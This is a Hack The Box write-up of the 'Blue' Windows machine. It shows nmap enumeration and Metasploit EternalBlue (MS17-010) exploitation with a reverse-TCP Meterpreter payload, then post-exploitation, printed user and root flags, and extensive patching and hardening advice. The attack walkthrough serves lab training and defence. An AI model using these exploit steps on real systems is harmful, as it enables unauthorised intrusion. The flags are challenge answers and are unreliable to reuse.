# Blue: Hack The Box Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-yellow) ![OS](https://img.shields.io/badge/OS-Windows-blue) ![Category](https://img.shields.io/badge/Category-SMB%20Exploitation-red)

---

## Machine Information

| Attribute | Details |
|-----------|---------|
| **Machine Name** | Blue |
| **Difficulty** | Easy |
| **Platform** | Hack The Box |
| **Operating System** | Windows 7 Professional SP1 |
| **IP Address** | 10.129.2.41 |
| **Hostname** | HARIS-PC |
| **Category** | Remote Code Execution / SMB Vulnerability |
| **Focus** | MS17-010 (EternalBlue) Exploitation |

---

## Table of Contents

- [Overview](#overview)
- [Initial Enumeration](#initial-enumeration)
- [Service Identification](#service-identification)
- [Vulnerability Assessment](#vulnerability-assessment)
- [Exploitation](#exploitation)
- [Post-Exploitation](#post-exploitation)
- [Flag Retrieval](#flag-retrieval)
- [Impact Analysis](#impact-analysis)
- [Remediation Strategies](#remediation-strategies)
- [Key Takeaways](#key-takeaways)

---

## Overview

**Blue** is an "Easy" difficulty Windows machine from Hack The Box that demonstrates the exploitation of one of the most critical vulnerabilities in modern cybersecurity history: **MS17-010**, commonly known as **EternalBlue**.

This vulnerability in Microsoft's SMB (Server Message Block) protocol allows for **unauthenticated remote code execution** and was famously weaponized by the **WannaCry** and **NotPetya** ransomware attacks that caused billions of dollars in damage worldwide.

**Learning Objectives:**
- Understanding SMB service enumeration
- Identifying critical vulnerabilities (MS17-010)
- Exploiting SMB vulnerabilities with Metasploit
- Post-exploitation techniques on Windows systems
- Understanding the real-world impact of unpatched systems

> 🚨 **Historical Context:** EternalBlue was developed by the NSA and leaked by the Shadow Brokers group in 2017. It remains one of the most exploited vulnerabilities in cybersecurity history.

---

## Initial Enumeration

### Port Scanning

We begin with a comprehensive port scan to identify all running services:

```bash
nmap -sC -sV -p- -oN nmap/blue_full_scan 10.129.2.41
```

**Results:**
```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
```

**Key Findings:**
- 🔓 **Port 135:** Microsoft RPC
- 🔓 **Port 139:** NetBIOS Session Service
- 🔓 **Port 445:** SMB (🎯 **Primary target**)
- 🔓 **Ports 49152-49157:** Dynamic RPC ports

### SMB Service Details

```bash
nmap -p 445 --script smb-os-discovery 10.129.2.41
```

**Output:**
```
Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
```

> 💡 **Analysis:** Windows 7 SP1 is a legacy operating system that reached end-of-life in January 2020, making it highly susceptible to known vulnerabilities.

---

## Service Identification

### SMB Protocol Analysis

**SMB (Server Message Block)** is a network file sharing protocol that allows:
- File and printer sharing
- Inter-process communication
- Network browsing
- Authentication services

**Versions:**
- **SMBv1**: Legacy, highly vulnerable (used here)
- **SMBv2**: Improved security and performance
- **SMBv3**: Modern, encrypted version

### SMB Security Assessment

Running security checks on the SMB service:

```bash
nmap -p445 --script smb-protocols 10.129.2.41
```

**Results:**
```
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1)
|     2.02
|     2.10
```

**Security Scan:**
```bash
nmap -p445 --script smb-security-mode 10.129.2.41
```

**Output:**
```
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|   message_signing: disabled (dangerous, but default)
```

**🚨 Critical Security Issues Identified:**
- ❌ **SMBv1 enabled** (obsolete and vulnerable)
- ❌ **Message signing disabled** (allows man-in-the-middle attacks)
- ⚠️ **Guest account accessible**
- ⚠️ **Legacy authentication methods supported**

---

## Vulnerability Assessment

### Scanning for MS17-010

Using Nmap's vulnerability scanning scripts:

```bash
nmap -p445 --script smb-vuln-ms17-010 10.129.2.41
```

**Results:**
```
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|       servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

### Vulnerability Details

**CVE ID:** CVE-2017-0143 (part of MS17-010 family)  
**Vulnerability Type:** Remote Code Execution  
**CVSS Score:** 9.3 (Critical)  
**Affected Systems:** Windows Vista, 7, 8.1, 10, Server 2008/2012/2016

**MS17-010 Vulnerability Family:**
- CVE-2017-0143
- CVE-2017-0144
- CVE-2017-0145
- CVE-2017-0146
- CVE-2017-0147
- CVE-2017-0148

**Technical Description:**

MS17-010 (EternalBlue) is a critical vulnerability in the SMBv1 protocol that occurs due to improper handling of specially crafted packets. The vulnerability allows an attacker to:
- Execute arbitrary code remotely
- Gain SYSTEM-level privileges
- Perform this attack **without authentication**
- Exploit the vulnerability from the network level

> 🎯 **Key Point:** This is a **wormable** vulnerability: malware can spread automatically across networks without user interaction.

---

## Exploitation

### Metasploit Framework Setup

Launch Metasploit and configure the exploit:

```bash
msfconsole
```

**Search for EternalBlue exploits:**
```bash
msf6 > search ms17-010
```

**Output:**
```
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
```

### Select and Configure Exploit

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

**Set required parameters:**
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.129.2.41
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
```

**Verify configuration:**
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.129.2.41      yes       The target host(s)
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        The Windows domain to use for authentication
   SMBPass                         no        The password for the specified username
   SMBUser                         no        The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.5       yes       The listen address (attacker IP)
   LPORT     4444             yes       The listen port
```

### Execute Exploit

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

**Exploitation Output:**
```
[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] 10.129.2.41:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.2.41:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.2.41:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.129.2.41:445 - Connecting to target for exploitation.
[+] 10.129.2.41:445 - Connection established for exploitation.
[+] 10.129.2.41:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.2.41:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.2.41:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.2.41:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.2.41:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.2.41:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.2.41:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.2.41:445 - Sending all but last fragment of exploit packet
[*] 10.129.2.41:445 - Starting non-paged pool grooming
[+] 10.129.2.41:445 - Sending SMBv2 buffers
[+] 10.129.2.41:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.2.41:445 - Sending final SMBv2 buffers.
[*] 10.129.2.41:445 - Sending last fragment of exploit packet!
[*] 10.129.2.41:445 - Receiving response from exploit packet
[+] 10.129.2.41:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.2.41:445 - Sending egg to corrupted connection.
[*] 10.129.2.41:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.129.2.41
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.129.2.41:49158) at 2026-02-07 18:45:23 +0100
[+] 10.129.2.41:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.2.41:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.2.41:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 
```

**🎉 Exploitation Successful!**

### Verify Privilege Level

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**🔓 Result:** We have **SYSTEM** level access: the highest privilege on Windows (equivalent to root on Linux)

---

## Post-Exploitation

### System Information Gathering

**Check system details:**
```bash
meterpreter > sysinfo
Computer        : HARIS-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

**View current process:**
```bash
meterpreter > ps
```

### User Enumeration

**Drop into a shell:**
```bash
meterpreter > shell
Process 2856 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

**List all users:**
```bash
C:\Windows\system32> net user

User accounts for \\HARIS-PC

-------------------------------------------------------------------------------
Administrator            Guest                    haris                    
The command completed successfully.
```

**Get detailed user information:**
```bash
C:\Windows\system32> net user haris
User name                    haris
Full Name                    
Comment                      
User's comment               
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            15/03/2017 10:44:33
Password expires             Never
Password changeable          15/03/2017 10:44:33
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   15/03/2017 10:45:27

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
```

**Check administrator account:**
```bash
C:\Windows\system32> net user Administrator
User name                    Administrator
Full Name                    
Comment                      Built-in account for administering the computer/domain
User's comment               
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            14/03/2017 11:58:46
Password expires             Never
Password changeable          14/03/2017 11:58:46
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   14/07/2017 09:42:19

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
```

### File System Enumeration

**Navigate to user directories:**
```bash
C:\Windows\system32> cd C:\Users
C:\Users> dir

 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users

14/03/2017  11:58    <DIR>          .
14/03/2017  11:58    <DIR>          ..
14/03/2017  11:58    <DIR>          Administrator
14/07/2009  04:20    <DIR>          Public
14/03/2017  12:58    <DIR>          haris
```

---

## Flag Retrieval

### User Flag

**Navigate to haris's desktop:**
```bash
C:\Users> cd haris\Desktop
C:\Users\haris\Desktop> dir

 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\haris\Desktop

24/12/2017  03:23    <DIR>          .
24/12/2017  03:23    <DIR>          ..
21/07/2017  07:54                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,727,292,416 bytes free
```

**Read user flag:**
```bash
C:\Users\haris\Desktop> type user.txt
4c546aea7dbee75cbd71de245c8deea9
```

**🚩 User Flag:** `4c546aea7dbee75cbd71de245c8deea9`

### Root Flag

**Navigate to Administrator's desktop:**
```bash
C:\Users\haris\Desktop> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> dir

 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\Administrator\Desktop

24/12/2017  03:22    <DIR>          .
24/12/2017  03:22    <DIR>          ..
21/07/2017  07:57                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,727,292,416 bytes free
```

**Read root flag:**
```bash
C:\Users\Administrator\Desktop> type root.txt
ff548eb71e920ff6c08843ce9df4e717
```

**🚩 Root Flag:** `ff548eb71e920ff6c08843ce9df4e717`

### Alternative Flag Retrieval (Meterpreter)

**Using Meterpreter's search functionality:**
```bash
meterpreter > search -f user.txt
Found 1 result...
    c:\Users\haris\Desktop\user.txt (32 bytes)

meterpreter > cat "c:\Users\haris\Desktop\user.txt"
4c546aea7dbee75cbd71de245c8deea9

meterpreter > search -f root.txt
Found 1 result...
    c:\Users\Administrator\Desktop\root.txt (32 bytes)

meterpreter > cat "c:\Users\Administrator\Desktop\root.txt"
ff548eb71e920ff6c08843ce9df4e717
```

---

## Impact Analysis

### Vulnerability Severity

**CVSS v3.1 Score:** 9.3 (Critical)  
**Attack Vector:** Network  
**Attack Complexity:** Low  
**Privileges Required:** None  
**User Interaction:** None  
**Scope:** Unchanged  
**Confidentiality Impact:** High  
**Integrity Impact:** High  
**Availability Impact:** High

### Technical Impact

A successful MS17-010 exploitation allows an attacker to:

| Impact Category | Description |
|----------------|-------------|
| 🔓 **Remote Code Execution** | Execute arbitrary code without authentication |
| 👑 **SYSTEM Privileges** | Gain highest privilege level on the system |
| 📂 **Full Data Access** | Read, modify, or delete any file on the system |
| 🔐 **Credential Theft** | Extract credentials from memory (SAM, LSASS) |
| 🌐 **Lateral Movement** | Use compromised system to attack other network hosts |
| 🦠 **Malware Deployment** | Install persistent backdoors or ransomware |
| 📡 **Network Propagation** | Wormable: automatically spread across networks |

### Real-World Impact

**Historical Examples:**

#### 🦠 WannaCry Ransomware (May 2017)
- **Affected:** 300,000+ computers in 150 countries
- **Damage:** Estimated $4 billion in losses
- **Victims:** NHS (UK), FedEx, Telefónica, Renault
- **Method:** Exploited MS17-010 to spread automatically

#### 🦠 NotPetya Ransomware (June 2017)
- **Affected:** Major corporations worldwide
- **Damage:** Estimated $10 billion in losses
- **Victims:** Maersk, Merck, FedEx, DLA Piper
- **Method:** Combined MS17-010 with credential theft

#### Business Impact in Production Environments

**Financial:**
- 💰 Ransomware payments (often hundreds of thousands of dollars)
- 💸 Operational downtime costs
- 📉 Loss of business during recovery
- ⚖️ Legal and regulatory fines

**Operational:**
- 🏥 Healthcare services disruption (WannaCry affected hospitals)
- 🚢 Supply chain interruptions (Maersk shipping delays)
- 🏭 Manufacturing shutdowns
- 💾 Data loss and corruption

**Reputational:**
- 📰 Negative media coverage
- 👥 Customer trust erosion
- 📊 Stock price impacts
- 🤝 Partner relationship damage

> 🚨 **Critical Note:** Despite patches being available since March 2017, MS17-010 remains one of the most exploited vulnerabilities due to unpatched legacy systems.

---

## Remediation Strategies

### 🔴 Immediate Actions (Critical Priority)

#### 1. Apply Microsoft Security Patch MS17-010

**Windows Update:**
```powershell
# Check for updates
wuauclt /detectnow /updatenow

# Or use PowerShell
Install-WindowsUpdate -AcceptAll -AutoReboot
```

**Manual Patch Installation:**
- Download from [Microsoft Security Updates](https://technet.microsoft.com/en-us/library/security/ms17-010.aspx)
- Install KB4012212, KB4012213, KB4012214, KB4012215, or KB4012216 (depending on OS version)

**Verify patch installation:**
```powershell
Get-HotFix | Where-Object {$_.HotFixID -eq "KB4012212"}
```

#### 2. Disable SMBv1

**PowerShell method (Windows 8.1/Server 2012 R2+):**
```powershell
# Disable SMBv1
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart

# Verify SMBv1 is disabled
Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
```

**Registry method (all Windows versions):**
```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" SMB1 -Type DWORD -Value 0 -Force
```

**Server Manager method:**
1. Open Server Manager
2. Remove "SMB 1.0/CIFS File Sharing Support" feature
3. Restart the system

#### 3. Enable SMB Signing

**Group Policy:**
```
Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
- Microsoft network client: Digitally sign communications (always) → Enabled
- Microsoft network server: Digitally sign communications (always) → Enabled
```

**Registry:**
```powershell
# Server-side
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters" -Name "RequireSecuritySignature" -Value 1

# Client-side
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanManWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 1
```

#### 4. Firewall Rules

**Block SMB ports from external networks:**
```powershell
# Block port 445 (SMB)
New-NetFirewallRule -DisplayName "Block SMB Inbound" -Direction Inbound -LocalPort 445 -Protocol TCP -Action Block

# Block port 139 (NetBIOS)
New-NetFirewallRule -DisplayName "Block NetBIOS Inbound" -Direction Inbound -LocalPort 139 -Protocol TCP -Action Block
```

**Allow only from trusted internal networks:**
```powershell
New-NetFirewallRule -DisplayName "Allow SMB from Internal" -Direction Inbound -LocalPort 445 -Protocol TCP -Action Allow -RemoteAddress 192.168.1.0/24
```

---

### 🟠 Short-Term Actions (High Priority)

#### 5. Network Segmentation

**Implementation:**
- 🔒 Isolate critical systems on separate VLANs
- 🚧 Implement DMZ for internet-facing services
- 🛡️ Use internal firewalls between network segments
- 📊 Monitor inter-segment traffic

**Network architecture:**
```
Internet
   ↓
[Firewall]
   ↓
[DMZ - Public Servers]
   ↓
[Internal Firewall]
   ↓
[Internal Network - Workstations]
   ↓
[Internal Firewall]
   ↓
[Critical Systems - Servers/Databases]
```

#### 6. Implement IDS/IPS

**Detection signatures for MS17-010:**
- Snort rules for EternalBlue detection
- Suricata signatures for SMB anomalies
- Network behavior analysis for exploitation attempts

**Recommended tools:**
- Snort / Suricata
- Zeek (Bro)
- Commercial IPS solutions

#### 7. Enable Enhanced Logging

**Windows Event Logging:**
```powershell
# Enable SMB logging
Set-SmbServerConfiguration -AuditSmb1Access $true

# Configure advanced audit policies
auditpol /set /subcategory:"File Share" /success:enable /failure:enable
auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
```

**Events to monitor:**
- Event ID 1000 (SMBv1 usage)
- Event ID 4624/4625 (Logon events)
- Event ID 5140-5145 (Network share access)

---

### 🟡 Long-Term Actions (Ongoing)

#### 8. Patch Management Program

**Best practices:**
- ✅ **Automated patching** for non-critical systems
- ✅ **Patch testing** in staging environment first
- ✅ **Monthly patch cycles** at minimum
- ✅ **Emergency patching** process for critical vulnerabilities
- ✅ **Patch compliance monitoring** and reporting

**Tools:**
- Microsoft WSUS (Windows Server Update Services)
- SCCM (System Center Configuration Manager)
- Third-party patch management solutions

#### 9. Vulnerability Assessment Program

**Regular scanning:**
```bash
# Nmap vulnerability scan
nmap -p445 --script smb-vuln* <target_network>

# Nessus/OpenVAS scans
# Schedule weekly internal scans
# Monthly external scans
```

**Vulnerability management lifecycle:**
1. 🔍 Discover → 2. 📊 Assess → 3. 🎯 Prioritize → 4. 🔧 Remediate → 5. ✅ Verify

#### 10. Security Awareness Training

**Training topics:**
- 📧 Phishing awareness
- 🔒 Password security
- 🚨 Incident reporting procedures
- 🛡️ Social engineering defenses
- 💾 Data handling best practices

**Frequency:**
- Initial training for new employees
- Annual refresher training
- Quarterly security bulletins
- Simulated phishing exercises

---

### 🔵 Organizational Controls

#### 11. Security Policies

**Required policies:**
- ✅ Patch management policy
- ✅ Vulnerability management policy
- ✅ Incident response policy
- ✅ Access control policy
- ✅ Network security policy

#### 12. Least Privilege Access

**Implementation:**
- 👤 Regular user accounts for daily tasks
- 👑 Administrative accounts only for administrative tasks
- 🔐 Just-in-time (JIT) privileged access
- 🎟️ Privileged Access Workstations (PAWs)
- 📝 Regular access reviews and audits

#### 13. Monitoring and Alerting

**Security monitoring:**
```
SIEM (Security Information and Event Management)
    ↓
Centralized Log Collection
    ↓
Correlation Rules
    ↓
Automated Alerts
    ↓
Incident Response
```

**Critical alerts:**
- 🚨 SMBv1 usage detection
- 🚨 Unusual SMB traffic patterns
- 🚨 Multiple failed authentication attempts
- 🚨 Unauthorized network scanning
- 🚨 Malware signatures

---

## Key Takeaways

### 🎯 Critical Lessons Learned

#### 1️⃣ Timely Patching is Critical
- **MS17-010 patch was available in March 2017**
- WannaCry and NotPetya attacks occurred **months after** patch release
- Unpatched systems remain vulnerable years later
- **Patch management is not optional**: it's a fundamental security requirement

#### 2️⃣ Legacy Systems are High-Risk
- Windows 7 reached end-of-life in January 2020
- Legacy OS = no security updates = permanent vulnerability
- Organizations must plan for **OS lifecycle management**
- Unsupported systems should be isolated or decommissioned

#### 3️⃣ Network Segmentation Limits Damage
- Wormable vulnerabilities can spread automatically across flat networks
- **Network segmentation** prevents lateral movement
- Critical systems should be isolated from general networks
- Defense-in-depth protects against single points of failure

#### 4️⃣ Disable Unnecessary Services
- **SMBv1 should be disabled** on all systems
- Legacy protocols increase attack surface
- Only enable services that are absolutely necessary
- Regular service audits identify unnecessary exposure

#### 5️⃣ Defense-in-Depth is Essential
Multiple security layers provide comprehensive protection:
```
Layer 1: Patching → Eliminates vulnerability
Layer 2: Firewall → Blocks network access
Layer 3: IDS/IPS → Detects exploitation attempts
Layer 4: Network Segmentation → Limits spread
Layer 5: Monitoring → Enables incident response
Layer 6: Backups → Enables recovery
```

---

## 🔧 Tools Used

| Tool | Purpose | Command Examples |
|------|---------|------------------|
| **Nmap** | Port scanning & vulnerability detection | `nmap -sC -sV -p- <target>` |
| **Metasploit** | Exploitation framework | `msfconsole` |
| **Meterpreter** | Post-exploitation payload | `getuid`, `sysinfo`, `hashdump` |

---

## 📚 Additional Resources

### Microsoft Security Bulletins
- [MS17-010 Security Bulletin](https://technet.microsoft.com/en-us/library/security/ms17-010.aspx)
- [Customer Guidance for WannaCrypt attacks](https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/)

### CVE References
- [CVE-2017-0143](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143)
- [CVE-2017-0144](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144)
- [CVE-2017-0145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0145)

### Security Research
- [Shadow Brokers Leak Analysis](https://www.fireeye.com/blog/threat-research/2017/04/wannacry_malware_profile.html)
- [EternalBlue Technical Analysis](https://www.rapid7.com/blog/post/2017/05/15/eternalblue-exploit-analysis/)

### Compliance Frameworks
- NIST Cybersecurity Framework
- CIS Critical Security Controls
- ISO 27001/27002
- PCI DSS

---

## 🎓 Exam & Certification Relevance

This box is excellent preparation for:
- ✅ **OSCP (Offensive Security Certified Professional)**
- ✅ **CEH (Certified Ethical Hacker)**
- ✅ **GPEN (GIAC Penetration Tester)**
- ✅ **eJPT (eLearnSecurity Junior Penetration Tester)**

**Key skills demonstrated:**
- Network enumeration
- Vulnerability identification
- Metasploit usage
- Windows post-exploitation
- Privilege escalation verification
- Flag retrieval techniques

---

**Author:** Gresa Hisa (@gresium)  
**Role:** AI & Cybersecurity Engineer | AI & Machine Learning Specialist  
**GitHub:** [https://github.com/gresium](https://github.com/gresium)  
**Date:** February 7, 2026  
**Machine IP:** 10.129.2.41  
**Difficulty:** Easy  
**Points:** 20

---

*This writeup is for educational purposes only. Always ensure you have proper authorization before testing any systems. EternalBlue is a critical vulnerability: use this knowledge responsibly.*
